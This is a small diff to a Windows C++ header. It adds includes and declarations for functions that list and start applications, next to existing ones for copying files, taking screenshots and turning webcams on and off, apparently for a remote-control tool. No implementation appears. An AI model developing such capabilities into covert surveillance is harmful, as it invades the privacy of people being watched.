@@ -3,8 +3,10 @@
 #include <atomic>
 #include <fstream>
 #include <iostream>
+#include <shlobj.h>
 #include <string>
 #include <thread>
+#include <vector>
 #include <windows.h>
 
 #include "const.h"
@@ -20,3 +22,5 @@ bool copyFile(std::string& filenames, std::string& result);
 bool captureScreenshot(std::string& filePath, std::string& result, std::ifstream& in);
 bool startWebcam(std::string& result);
 bool stopWebcam(std::string& result);
+bool listApps(std::string& result);
+bool startApp(std::string name, std::string& result);
